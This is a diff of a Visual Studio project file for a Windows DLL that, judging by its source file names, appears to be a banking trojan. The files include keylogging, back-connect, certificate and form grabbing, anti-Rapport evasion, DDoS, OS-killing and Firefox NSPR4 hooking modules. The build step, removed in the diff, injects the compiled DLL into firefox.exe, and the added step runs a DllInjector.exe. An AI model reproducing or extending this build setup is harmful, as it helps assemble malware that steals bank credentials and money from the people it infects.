@@ -18,7 +18,7 @@
 	<Configurations>
 		<Configuration
 			Name="Debug|Win32"
-			OutputDirectory="$(SolutionDir)Bin\"
+			OutputDirectory="d:\DebugDLL\"
 			IntermediateDirectory="Objs\$(ConfigurationName)"
 			ConfigurationType="2"
 			CharacterSet="2"
@@ -47,6 +47,7 @@
 				BasicRuntimeChecks="3"
 				RuntimeLibrary="1"
 				UsePrecompiledHeader="0"
+				BrowseInformation="1"
 				WarningLevel="3"
 				DebugInformationFormat="4"
 			/>
@@ -89,12 +90,13 @@
 			/>
 			<Tool
 				Name="VCPostBuildEventTool"
-				CommandLine="$(SolutionDir)\Bin\InjectDll.exe firefox.exe &quot;$(OutDir)\$(ProjectName).dll&quot;  Start"
+				CommandLine="d:\DebugDLL\DllInjector.exe"
+				ExcludedFromBuild="false"
 			/>
 		</Configuration>
 		<Configuration
 			Name="Release|Win32"
-			OutputDirectory="$(SolutionDir)Bin\"
+			OutputDirectory="d:\DebugDLL\"
 			IntermediateDirectory="Objs\$(ConfigurationName)"
 			ConfigurationType="2"
 			CharacterSet="0"
@@ -167,11 +169,12 @@
 			/>
 			<Tool
 				Name="VCPostBuildEventTool"
+				CommandLine="d:\DebugDLL\DllInjector.exe"
 			/>
 		</Configuration>
 		<Configuration
 			Name="Release DEBUGCONFIG|Win32"
-			OutputDirectory="$(SolutionDir)Bin\$(ConfigurationName)"
+			OutputDirectory="d:\DebugDLL\"
 			IntermediateDirectory="Objs\$(ConfigurationName)"
 			ConfigurationType="2"
 			CharacterSet="0"
@@ -249,7 +252,7 @@
 			/>
 			<Tool
 				Name="VCPostBuildEventTool"
-				CommandLine="$(SolutionDir)\Bin\InjectDll.exe firefox.exe &quot;$(OutDir)\$(ProjectName).dll&quot;  Start"
+				CommandLine="d:\DebugDLL\DllInjector.exe"
 			/>
 		</Configuration>
 	</Configurations>
@@ -262,15 +265,7 @@
 			UniqueIdentifier="{4FC737F1-C7A5-4376-A066-2A32D752A2FF}"
 			>
 			<File
-				RelativePath="..\..\Source\Misc\antirapport.cpp"
-				>
-			</File>
-			<File
-				RelativePath="..\..\source\RuBnk\AzConfig.cpp"
-				>
-			</File>
-			<File
-				RelativePath="..\..\Source\Misc\BackConnect.cpp"
+				RelativePath="..\..\source\Misc\BackConnect.cpp"
 				>
 			</File>
 			<File
@@ -338,15 +333,11 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\Misc\CertGrab.cpp"
+				RelativePath="..\..\source\Common\Chrome.cpp"
 				>
 			</File>
 			<File
 				RelativePath="..\..\Source\Misc\CmdLine.cpp"
-				>
-			</File>
-			<File
-				RelativePath="..\..\Source\Misc\ComandLoadDLL.cpp"
 				>
 			</File>
 			<File
@@ -362,23 +353,7 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\RuBnk\Cyberplat.cpp"
-				>
-			</File>
-			<File
-				RelativePath="..\..\Source\Misc\CyberPlatDLL.cpp"
-				>
-			</File>
-			<File
-				RelativePath="..\..\Source\Misc\ddos.cpp"
-				>
-			</File>
-			<File
 				RelativePath="..\..\Source\Core\DllLoader.cpp"
-				>
-			</File>
-			<File
-				RelativePath="..\..\Source\Common\Exploit.cpp"
 				>
 			</File>
 			<File
@@ -394,10 +369,6 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\Misc\FtpSniffer.cpp"
-				>
-			</File>
-			<File
 				RelativePath="..\..\Source\Core\GetApi.cpp"
 				>
 			</File>
@@ -410,11 +381,11 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\source\Common\HTMLInjectsScriptAdapter.cpp"
+				RelativePath="..\..\source\Common\Grabbers.cpp"
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\Misc\Hunter.cpp"
+				RelativePath="..\..\source\Common\HTMLInjectsScriptAdapter.cpp"
 				>
 			</File>
 			<File
@@ -423,14 +394,6 @@
 			</File>
 			<File
 				RelativePath="..\..\Source\Common\IECacheUtils.cpp"
-				>
-			</File>
-			<File
-				RelativePath="..\..\source\RuBnk\IfobsOnline.cpp"
-				>
-			</File>
-			<File
-				RelativePath="..\..\Source\Misc\imbicili.cpp"
 				>
 			</File>
 			<File
@@ -458,7 +421,7 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\Misc\KillOs_Reboot.cpp"
+				RelativePath="..\..\source\Misc\KillOs_Reboot.cpp"
 				>
 			</File>
 			<File
@@ -478,11 +441,11 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\Common\Opera.cpp"
+				RelativePath="..\..\source\Common\NSPR4Hooks.cpp"
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\Misc\PackageLoad.cpp"
+				RelativePath="..\..\Source\Common\Opera.cpp"
 				>
 			</File>
 			<File
@@ -506,23 +469,7 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\RuBnk\RuBnk.cpp"
-				>
-			</File>
-			<File
-				RelativePath="..\..\Source\RuBnk\Sber.cpp"
-				>
-			</File>
-			<File
-				RelativePath="..\..\Source\RuBnk\SberKeyLogger.cpp"
-				>
-			</File>
-			<File
 				RelativePath="..\..\Source\Common\ScreenShots.cpp"
-				>
-			</File>
-			<File
-				RelativePath="..\..\Source\Misc\SocksService.cpp"
 				>
 			</File>
 			<File
@@ -534,10 +481,6 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\Misc\StealthBrowser.cpp"
-				>
-			</File>
-			<File
 				RelativePath="..\..\source\Core\StrConsts.cpp"
 				>
 			</File>
@@ -546,11 +489,7 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\Common\Task.cpp"
-				>
-			</File>
-			<File
-				RelativePath="..\..\Source\Misc\Trade.cpp"
+				RelativePath="..\..\source\Common\Task.cpp"
 				>
 			</File>
 			<File
@@ -566,11 +505,7 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\Common\VideoRecorder.cpp"
-				>
-			</File>
-			<File
-				RelativePath="..\..\Source\Misc\web_money_dll.cpp"
+				RelativePath="..\..\source\Common\VideoRecorder.cpp"
 				>
 			</File>
 			<File
@@ -656,15 +591,19 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\Common\CabPacker.h"
-				>
-			</File>
-			<File
 				RelativePath="..\..\Source\RuBnk\CabPacker.h"
 				>
 			</File>
 			<File
+				RelativePath="..\..\Source\Common\CabPacker.h"
+				>
+			</File>
+			<File
 				RelativePath="..\..\Source\Misc\CertGrab.h"
+				>
+			</File>
+			<File
+				RelativePath="..\..\source\Common\Chrome.h"
 				>
 			</File>
 			<File
@@ -740,6 +679,10 @@
 				>
 			</File>
 			<File
+				RelativePath="..\..\source\Common\Grabbers.h"
+				>
+			</File>
+			<File
 				RelativePath="..\..\source\Common\HTMLInjectsScriptAdapter.h"
 				>
 			</File>
@@ -784,10 +727,6 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\RuBnk\JavaConfig.cpp"
-				>
-			</File>
-			<File
 				RelativePath="..\..\Source\RuBnk\JavaConfig.h"
 				>
 			</File>
@@ -825,6 +764,14 @@
 			</File>
 			<File
 				RelativePath=".\Modules\Modules.h"
+				>
+			</File>
+			<File
+				RelativePath="..\..\source\Common\NSPR4Def.h"
+				>
+			</File>
+			<File
+				RelativePath="..\..\source\Common\NSPR4Hooks.h"
 				>
 			</File>
 			<File
